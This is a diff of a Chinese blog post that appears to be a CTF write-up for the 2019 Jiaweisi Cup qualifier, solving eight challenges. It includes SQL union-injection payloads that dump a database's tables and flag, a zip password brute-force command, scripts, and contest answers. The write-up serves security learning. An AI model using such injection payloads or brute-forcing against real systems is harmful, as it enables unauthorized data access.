@@ -131,42 +131,44 @@
 <h3 id="官方WriteUp"><a href="#官方WriteUp" class="headerlink" title="官方WriteUp"></a>官方WriteUp</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNTA4OTI5Mg==&amp;mid=2647708779&amp;idx=1&amp;sn=ac6bc3a3d912fc405d2d5b497ba47d22&amp;chksm=8fb9dd88b8ce549e5f037eb609cc3340c3362bca2678053f1dde0c99ce4108aa50f7d38e523a&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">官方2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp</a></p>
 <hr>
 <h3 id="第一题（土肥原贤二）"><a href="#第一题（土肥原贤二）" class="headerlink" title="第一题（土肥原贤二）"></a>第一题（土肥原贤二）</h3><p>SQL注入，gid通过单引号包裹，比较简单就呈现出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-1.png" alt></p>
 <p>联合注入测试成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-2.png" alt></p>
 <p>爆数据库、表、列、flag值</p>
-<pre><code>-1&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #
+<pre><code class="Code">-1&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #
 -1&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;flag&#39; #
 -1&#39; union select 1,2,3,flag from flag #
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-3.png" alt="1-3"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/1-3.png" alt></p>
 <p><code>flag{ 20_welcome_19 }</code></p>
 <hr>
 <h3 id="第二题（吴佩孚）"><a href="#第二题（吴佩孚）" class="headerlink" title="第二题（吴佩孚）"></a>第二题（吴佩孚）</h3><p>链接打开发现是Base64</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-1.png" alt></p>
 <p>拿去在线网站解密一下，得到jsfuck</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-2.png" alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-2.png" alt></p>
 <p>直接放到Console，回车一下，flag就出来了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-3.png" alt="2-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/2-3.png" alt></p>
 <p><code>flag{sdf465454dfgert32}</code></p>
 <hr>
 <h3 id="第三题（死亡真相）"><a href="#第三题（死亡真相）" class="headerlink" title="第三题（死亡真相）"></a>第三题（死亡真相）</h3><p>下载下来一个wav文件，用Audacity打开看一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-1.png" alt="3-1"></p>
 <p>点击左上角那一小块，选择”波频图”，可以看到有信息出来</p>
 <p>但是加上下斜杠，提交时却是错的，官方特地说不是这个flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-2.png" alt="3-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-2.png" alt></p>
 <p>既然缺少信息，就放到winhex里面看一下，在末尾发现zero字样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-3.png" alt="3-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-3.png" alt></p>
 <p>再看刚才的那串数字，想会不会是MD5，然后往空处补上0，刚好32位得到：</p>
-<pre><code>85a9d4517d47250b908cbc9fd0554216
-</code></pre><p>拿去在线网站解密一下，拿到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-4.png" alt="3-4"></p>
+<pre><code class="Code">85a9d4517d47250b908cbc9fd0554216
+</code></pre>
+<p>拿去在线网站解密一下，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/3-4.png" alt></p>
 <p><code>flag{hsd132456}</code></p>
 <hr>
 <h3 id="第四题（日军空袭）"><a href="#第四题（日军空袭）" class="headerlink" title="第四题（日军空袭）"></a>第四题（日军空袭）</h3><p>看到是Base64加密</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-1.png" alt></p>
 <p>内容提取出来，放到Notepad++里面解密一下，发现后面接了%3D</p>
 <p>%3D就是等号（=）的URL编码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-2.png" alt="4-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-2.png" alt></p>
 <p>判断是base64混合url循环编码，直接写个Python脚本解码</p>
 <pre><code class="python">import base64
 import urllib.parse
@@ -184,23 +186,23 @@ while True:
 print s
 </code></pre>
 <p>果然可以得到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-3.png" alt="4-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-3.png" alt></p>
 <p>但是这个flag还经过栅栏密码处理，找个在线网站解密一下就可以：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码传送门</a></p>
 <p>组数为5时得到我们的flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-4.png" alt="4-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-4.png" alt></p>
 <p><code>flag{B64_&amp;_2hai_14i}</code></p>
 <hr>
 <h3 id="第五题（飞虎队）"><a href="#第五题（飞虎队）" class="headerlink" title="第五题（飞虎队）"></a>第五题（飞虎队）</h3><p>Crypto — 希尔加密</p>
 <p>关于解密过程：<a href="http://2-dreamfever.lofter.com/post/1d226cf1_748daf4?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">希尔加密WriteUp</a></p>
 <p>矩阵行列式求法：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-2.png" alt></p>
 <p>关于最小公倍数：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-3.png" alt="5-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-3.png" alt></p>
 <p>本题的<code>WriteUp</code>看前文提供的那2篇</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-1.png" alt></p>
 <hr>
 <h3 id="第六题（戴星炳）"><a href="#第六题（戴星炳）" class="headerlink" title="第六题（戴星炳）"></a>第六题（戴星炳）</h3><p>算式的内容每2秒就会变，所以需要通过python的Session机制提交计算结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-1.png" alt="6-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-1.png" alt></p>
 <p>代码如下：</p>
 <pre><code class="python">import requests,re
 from bs4 import BeautifulSoup
@@ -219,26 +221,27 @@ d = a.post(url,data=data)
 print(d.text)
 </code></pre>
 <p>运行一下flag就出来了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-2.png" alt></p>
 <p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
 <hr>
-<h3 id="第七题（大美晚报）"><a href="#第七题（大美晚报）" class="headerlink" title="第七题（大美晚报）"></a>第七题（大美晚报）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-1.png" alt="7-1"></p>
+<h3 id="第七题（大美晚报）"><a href="#第七题（大美晚报）" class="headerlink" title="第七题（大美晚报）"></a>第七题（大美晚报）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-1.png" alt></p>
 <p>将这张二维码保存下来，用手机扫描没有可用信息。用winhex打开，发现有藏着zip文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-2.png" alt="7-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-2.png" alt></p>
 <p>foremost直接提取出来一个zip文件。放入winhex中，将屁股后面多余的0删除掉</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-3.png" alt="7-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-3.png" alt></p>
 <p>Ps：这里要记得删除屁股后面多余的0，不然注释信息显示不出来用foremost提取出来会多出很多0，用binwalk -e就不会，不知道为什么</p>
 <p>尝试提取内容时，却发现是加密的。但是提示”管理员用了他的QQ号进行加密”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-4.png" alt="7-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-4.png" alt></p>
 <p>不知道管理员的QQ号，那就爆破，一般QQ号9位-11位，先从9位开始</p>
 <p>Ps：这里的-u需要特地加上去，因为不加上去不以zip格式爆破</p>
-<pre><code>fcracker -b -c 1 -l 9 -v -u 文件名
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-5.png" alt="7-5"></p>
+<pre><code class="Code">fcracker -b -c 1 -l 9 -v -u 文件名
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-5.png" alt></p>
 <p>输入密码，拿到文件，打开看到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-6.png" alt="7-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-6.png" alt></p>
 <p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
 <hr>
-<h3 id="第八题（潘汉年）"><a href="#第八题（潘汉年）" class="headerlink" title="第八题（潘汉年）"></a>第八题（潘汉年）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-1.png" alt="8-1"></p>
+<h3 id="第八题（潘汉年）"><a href="#第八题（潘汉年）" class="headerlink" title="第八题（潘汉年）"></a>第八题（潘汉年）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-1.png" alt></p>
 <p>做个简单的测试，将代码前4个字符和flag的ASCII码进行对比，代码如下：</p>
 <pre><code class="python">a = &quot;bg[`&quot;
 b = &quot;flag&quot;
@@ -250,7 +253,7 @@ for i in range(4):
     print(&quot;&quot;)
 </code></pre>
 <p>发现逐位在漂移为 4 的基础上 + 1</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-2.png" alt="8-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-2.png" alt></p>
 <p>根据这个还原flag，代码如下：</p>
 <pre><code class="python">a = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot;
 flag = &quot;&quot;
@@ -260,7 +263,7 @@ for i in range(len(a)):
 print(flag)
 </code></pre>
 <p>拿到flag</p>
